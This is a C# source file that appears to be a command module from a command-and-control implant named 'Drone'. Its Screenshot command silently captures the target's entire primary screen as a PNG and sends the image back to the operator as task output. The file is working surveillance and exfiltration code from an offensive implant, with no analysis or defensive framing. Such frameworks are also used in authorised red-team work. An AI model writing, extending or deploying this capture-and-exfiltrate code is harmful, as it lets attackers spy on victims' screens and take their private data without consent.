using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class Screenshot : DroneCommand
{
    public override byte Command => 0x09;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var size = new Size(
            (int)System.Windows.SystemParameters.PrimaryScreenWidth,
            (int)System.Windows.SystemParameters.PrimaryScreenHeight);

        using var ms = new MemoryStream();
        using var bitmap = new Bitmap(size.Width, size.Height);
        using var graphic = Graphics.FromImage(bitmap);
        
        graphic.CopyFromScreen(Point.Empty, Point.Empty, size);
        bitmap.Save(ms, ImageFormat.Png);
        
        await Drone.SendDroneTaskOutput(new DroneTaskResponse
        {
            TaskId = task.Id,
            Module = Command,
            Status = DroneTaskStatus.Complete,
            Output = ms.ToArray()
        });
    }
}